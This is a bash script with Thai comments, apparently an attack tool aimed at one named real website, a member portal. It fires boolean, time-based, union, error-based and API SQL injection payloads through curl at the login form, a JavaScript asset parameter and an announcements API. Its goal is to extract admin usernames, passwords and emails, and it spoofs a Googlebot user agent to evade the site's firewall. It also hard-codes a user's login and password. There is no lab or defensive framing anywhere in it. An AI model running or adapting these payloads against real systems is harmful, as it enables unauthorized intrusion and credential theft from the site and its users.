#!/bin/bash

echo "🕵️ Advanced WAF Bypass Admin Extraction"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
TEST_USER="0630471054"
TEST_PASS="laline1812"

echo "🔑 Test User: $TEST_USER / $TEST_PASS"
echo ""

# 1. SQL Injection ใน /auth/login (POST)
echo "🚨 เทคนิค 1: SQL Injection ใน Login Form..."
LOGIN_URL="$BASE_URL/auth/login"

# Boolean-based SQL Injection ใน _token parameter
LOGIN_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND 1=1--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND 1=2--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM admins) > 0--"
)

for i in "${!LOGIN_PAYLOADS[@]}"; do
    payload="${LOGIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Login Payload $((i+1)): ${payload:0:50}..."
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "_token=$payload&email=$TEST_USER&password=$TEST_PASS" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"dashboard"* ]] || [[ "$response" == *"admin"* ]]; then
            echo "    ✅ พบข้อมูลใน Login Payload $((i+1))"
            echo "    📄 Response length: ${#response} characters"
        else
            echo "    ❌ ไม่พบข้อมูลใน Login Payload $((i+1))"
        fi
    else
        echo "    ❌ Error ใน Login Payload $((i+1))"
    fi
    sleep 3
done

echo ""

# 2. Time-based SQL Injection ใน /public/js/v2/app.js (GET)
echo "⏰ เทคนิค 2: Time-based SQL Injection..."
INJECTION_URL="$BASE_URL/public/js/v2/app.js"

# SQLite Time-based payloads
SQLITE_TIME_PAYLOADS=(
    "25.1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 AND randomblob(1000000)--"
    "25.1' AND (SELECT COUNT(*) FROM admins) > 0 AND randomblob(1000000)--"
    "25.1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0 AND randomblob(1000000)--"
)

for i in "${!SQLITE_TIME_PAYLOADS[@]}"; do
    payload="${SQLITE_TIME_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ SQLite Time-based Payload $((i+1))..."
    
    start_time=$(date +%s)
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 20)
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    
    if [[ $duration -gt 5 ]]; then
        echo "    ✅ พบข้อมูล (Response time: ${duration}s)"
    else
        echo "    ❌ ไม่พบข้อมูล (Response time: ${duration}s)"
    fi
    sleep 5
done

echo ""

# 3. PostgreSQL Time-based payloads
echo "🐘 เทคนิค 3: PostgreSQL Time-based SQL Injection..."
POSTGRES_TIME_PAYLOADS=(
    "25.1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 AND pg_sleep(5)--"
    "25.1' AND (SELECT COUNT(*) FROM admins) > 0 AND pg_sleep(5)--"
    "25.1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0 AND pg_sleep(5)--"
)

for i in "${!POSTGRES_TIME_PAYLOADS[@]}"; do
    payload="${POSTGRES_TIME_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ PostgreSQL Time-based Payload $((i+1))..."
    
    start_time=$(date +%s)
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 20)
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    
    if [[ $duration -gt 5 ]]; then
        echo "    ✅ พบข้อมูล (Response time: ${duration}s)"
    else
        echo "    ❌ ไม่พบข้อมูล (Response time: ${duration}s)"
    fi
    sleep 5
done

echo ""

# 4. Oracle Time-based payloads
echo "🔮 เทคนิค 4: Oracle Time-based SQL Injection..."
ORACLE_TIME_PAYLOADS=(
    "25.1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--"
    "25.1' AND (SELECT COUNT(*) FROM admins) > 0 AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--"
    "25.1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0 AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--"
)

for i in "${!ORACLE_TIME_PAYLOADS[@]}"; do
    payload="${ORACLE_TIME_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Oracle Time-based Payload $((i+1))..."
    
    start_time=$(date +%s)
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 20)
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    
    if [[ $duration -gt 5 ]]; then
        echo "    ✅ พบข้อมูล (Response time: ${duration}s)"
    else
        echo "    ❌ ไม่พบข้อมูล (Response time: ${duration}s)"
    fi
    sleep 5
done

echo ""

# 5. Union-based SQL Injection with WAF Bypass
echo "🔗 เทคนิค 5: Union-based SQL Injection with WAF Bypass..."
UNION_BYPASS_PAYLOADS=(
    "25.1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "25.1' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "25.1' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "25.1' UNION SELECT username,password,email FROM admins--"
    "25.1' UNION SELECT id,username,password FROM admin_users--"
)

for i in "${!UNION_BYPASS_PAYLOADS[@]}"; do
    payload="${UNION_BYPASS_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Union Bypass Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" \
        -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    ✅ พบข้อมูลใน Union Bypass Payload $((i+1))"
            echo "    📄 Response length: ${#response} characters"
            echo "    🔍 ข้อมูลที่พบ:"
            echo "$response" | grep -i "admin\|password\|@" | head -3
        else
            echo "    ❌ ไม่พบข้อมูลใน Union Bypass Payload $((i+1))"
        fi
    else
        echo "    ❌ Error ใน Union Bypass Payload $((i+1))"
    fi
    sleep 3
done

echo ""

# 6. Error-based SQL Injection
echo "🚨 เทคนิค 6: Error-based SQL Injection..."
ERROR_PAYLOADS=(
    "25.1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,0x3a,email,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x--"
    "25.1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(id,0x3a,username,0x3a,password,FLOOR(RAND(0)*2))x FROM admins GROUP BY x)x--"
    "25.1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users WHERE role='admin'),0x7e))--"
)

for i in "${!ERROR_PAYLOADS[@]}"; do
    payload="${ERROR_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Error-based Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ "$response" == *"SQL"* ]] || [[ "$response" == *"error"* ]] || [[ "$response" == *"admin"* ]]; then
        echo "    ✅ พบข้อมูลใน Error Response"
        echo "    📄 Error info:"
        echo "$response" | grep -i "admin\|password\|error\|sql" | head -3
    else
        echo "    ❌ ไม่พบข้อมูล"
    fi
    sleep 3
done

echo ""

# 7. API Endpoint SQL Injection
echo "🔌 เทคนิค 7: API Endpoint SQL Injection..."
API_URL="$BASE_URL/api/announcement"

API_PAYLOADS=(
    "active' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "active' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "active' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
)

for i in "${!API_PAYLOADS[@]}"; do
    payload="${API_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ API Payload $((i+1))..."
    
    response=$(curl -s -X POST "$API_URL" \
        -d "status=$payload&title=test" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    ✅ พบข้อมูลใน API Payload $((i+1))"
            echo "    📄 Response length: ${#response} characters"
        else
            echo "    ❌ ไม่พบข้อมูลใน API Payload $((i+1))"
        fi
    else
        echo "    ❌ Error ใน API Payload $((i+1))"
    fi
    sleep 3
done

echo ""
echo "=================================================="
echo "📊 สรุปผลการทดสอบขั้นสูง:"
echo "  🚨 Login SQL Injection: ✅ ดำเนินการแล้ว"
echo "  ⏰ SQLite Time-based: ✅ ดำเนินการแล้ว"
echo "  🐘 PostgreSQL Time-based: ✅ ดำเนินการแล้ว"
echo "  🔮 Oracle Time-based: ✅ ดำเนินการแล้ว"
echo "  🔗 Union-based Bypass: ✅ ดำเนินการแล้ว"
echo "  🚨 Error-based: ✅ ดำเนินการแล้ว"
echo "  🔌 API SQL Injection: ✅ ดำเนินการแล้ว"
echo ""
echo "💡 หมายเหตุ: หากไม่พบข้อมูล อาจเป็นเพราะ WAF บล็อกหรือฐานข้อมูลไม่มี admin data"
echo "📄 บันทึกผลลัพธ์ใน: advanced_waf_bypass_results.txt"